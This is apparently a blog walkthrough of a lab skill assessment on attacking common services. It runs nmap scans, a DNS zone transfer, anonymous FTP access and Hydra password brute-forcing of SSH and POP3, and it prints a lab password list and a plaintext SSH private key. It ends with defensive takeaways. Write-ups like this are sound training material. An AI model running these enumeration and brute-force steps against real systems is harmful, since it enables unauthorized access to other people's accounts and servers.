<html>
  <head>
    <link rel="icon" href="/assets/imgs/beans.png" type="image/png">
  </head>
  <img src="/assets/imgs/beans.png" alt="Logo" style="position: absolute; top: 0; left: 0; width: 200px; height: auto;"></html>

[Main Page](/index)

# Attacking Common Services Skill Assessment - Medium

> The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

Let's start with an nmap scan. I first like to run an nmap similar to this to quickly enumerate all open ports:

```
nmap --max-rate 10000 -T5 -p- <ip>
```

I then run a second nmap scan to enumerate versions and run default scripts like so:

```
nmap -sC -sV -p80,22,<etc> <ip>
```

So let's see what we have to work with!

```
Nmap scan report for 10.129.201.127
Host is up (0.058s latency).
Not shown: 64795 closed tcp ports (reset), 734 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 163.71 seconds
```

```
# Nmap 7.94SVN scan initiated Sun Feb  2 17:12:25 2025 as: /usr/lib/nmap/nmap --privileged -p22,53,110,995,2121 -sC -sV -oN nmap.out 10.129.201.127
Nmap scan report for 10.129.201.127
Host is up (0.080s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER SASL(PLAIN) UIDL TOP AUTH-RESP-CODE CAPA STLS RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER TOP AUTH-RESP-CODE CAPA PIPELINING RESP-CODES UIDL
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (InlaneFTP) [10.129.201.127]
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.94SVN%I=7%D=2/2%Time=679FEDD0%P=x86_64-pc-linux-gnu%r(
SF:NULL,31,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.201\.1
SF:27\]\r\n")%r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)
SF:\x20\[10\.129\.201\.127\]\r\n500\x20Invalid\x20command:\x20try\x20being
SF:\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20m
SF:ore\x20creative\r\n");
30021/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Internal FTP) [10.129.201.127]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL:
|_    220 ProFTPD Server (Internal FTP) [10.129.201.127]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30021-TCP:V=7.94SVN%I=7%D=2/12%Time=67AD7006%P=x86_64-pc-linux-gnu%
SF:r(NULL,34,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\[10\.129
SF:\.201\.127\]\r\n")%r(GenericLines,90,"220\x20ProFTPD\x20Server\x20\(Int
SF:ernal\x20FTP\)\x20\[10\.129\.201\.127\]\r\n500\x20Invalid\x20command:\x
SF:20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  2 17:13:32 2025 -- 1 IP address (1 host up) scanned in 66.76 seconds
```

We have ssh, dns, two ports running ftp (`Inlane FTP` and `Internal FTP`), and pop3. I expected the pop3 since it is an email server, but let's test the dns and see if we can get anything.

```
$ dig any inlanefreight.htb @10.129.201.127

; <<>> DiG 9.20.2-1-Debian <<>> any inlanefreight.htb @10.129.201.127
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36769
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 2c26bfa75a387a6d0100000067ad6e7c7e6b9a10b0383d30 (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      ANY

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       127.0.0.1

;; Query time: 60 msec
;; SERVER: 10.129.201.127#53(10.129.201.127) (TCP)
;; WHEN: Wed Feb 12 23:00:57 EST 2025
;; MSG SIZE  rcvd: 148
```

```
$ dig axfr inlanefreight.htb @10.129.201.127
                                                                                                                        ; <<>> DiG 9.20.2-1-Debian <<>> axfr inlanefreight.htb @10.129.201.127
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.200.5
dc1.inlanefreight.htb.  604800  IN      A       10.129.100.10
dc2.inlanefreight.htb.  604800  IN      A       10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN    A       127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN    A       10.129.200.70
ns.inlanefreight.htb.   604800  IN      A       127.0.0.1
un.inlanefreight.htb.   604800  IN      A       10.129.200.142
ws1.inlanefreight.htb.  604800  IN      A       10.129.200.101
ws2.inlanefreight.htb.  604800  IN      A       10.129.200.102
wsus.inlanefreight.htb. 604800  IN      A       10.129.200.80
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800;; Query time: 60 msec
;; SERVER: 10.129.201.127#53(10.129.201.127) (TCP)
;; WHEN: Sun Feb 02 17:24:53 EST 2025
;; XFR size: 13 records (messages 1, bytes 372)
```

Look's like it is vulnerable to zone transfer! That's a finding but so far won't help us getting into the machine. It does, however, tell us the the FQDN for this box is `int-ftp.inlanefreight.htb` so let's test ftp!

```
$ ftp 10.129.201.127 2121
Connected to 10.129.201.127.
220 ProFTPD Server (InlaneFTP) [10.129.201.127]
Name (10.129.201.127:kali): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
ftp: Login failed
```

No anonymous login for `InlaneFTP` so not much we can do there besides using Hydra which I only like to do as a last resort. How about `Internal FTP`?

```
$ ftp 10.129.201.127 30021
Connected to 10.129.201.127.
220 ProFTPD Server (Internal FTP) [10.129.201.127]
Name (10.129.201.127:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Nice! Let's poke around.

```
ftp> ls
229 Entering Extended Passive Mode (|||22766|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||41432|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||11280|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |***************************************************************************|   153       58.96 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (2.48 KiB/s)
ftp>
```

We got a `mynotes.txt` file. Looking at the contents it looks like a list of passwords:

```
$ cat mynotes.txt
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

Juicy. We also have the username of `simon`. Let's test if any of these passwords work with our `simon` user over SSH.

```
┌──(kali㉿DESKTOP-JETQH0C)-[~/mediumcommonsrvcs]
└─$ hydra -l simon -P mynotes.txt 10.129.201.127 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-02 18:04:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.129.201.127:22/
[22][ssh] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-02 18:04:34
```

Sweet! We're in!

```
$ ssh simon@10.129.201.127                                                                                            
The authenticity of host '10.129.201.127 (10.129.201.127)' can't be established.                                        ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.                                          This host key is known by the following other names/addresses:                                                              ~/.ssh/known_hosts:12: [hashed name]                                                                                Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                Warning: Permanently added '10.129.201.127' (ED25519) to the list of known hosts.                                       simon@10.129.201.127's password:                                                                                        Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
<..output ommitted..>
Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ ls
flag.txt  Maildir
```

Righteous! We got our flag. However, I can't help but peek a gander at the `Maildir`.

```
simon@lin-medium:~/Maildir/.INBOX/cur$ cat simon\:2\,S
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
        id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----
```

Dang! Now we have a private key as well! This makes me think that this was another way into the box! Let's go back and try pop3!

```
$ hydra -l simon -P mynotes.txt 10.129.201.127 pop3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-12 23:20:40
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking pop3://10.129.201.127:110/
[110][pop3] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```

Just as I suspected. Let's see if we can find that email.

```
$ telnet 10.129.201.127 110                                                                                           
Trying 10.129.201.127...
Connected to 10.129.201.127.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER simon
+OK
PASS 8Ns8j1b!23hs4921smHzwn
+OK Logged in.
LIST 1
+OK 1 messages:
1 1630
.
retr 1
+OK 1630 octets
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
        id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----
```

It worked! So instead of going straight for SSH we could've gone at pop3 and grabbed this private key. Some takeaways are don't allow anonymous login on FTP, don't write down your passwords anywhere accessible to others, and probably don't email a private key (and story a copy of said email) with an unencrypted service like pop3. As we could see in the nmap output, there was pop3s running aswell. However, best practice is to disable regular pop3 as it sends everything like usernames, passwords, and retreived emails in plain text. We could've viewed the same email over pop3s by connecting with openssl like this:

```
openssl s_client -connect 10.129.201.127:995
```

Thanks for reading! Cheers.
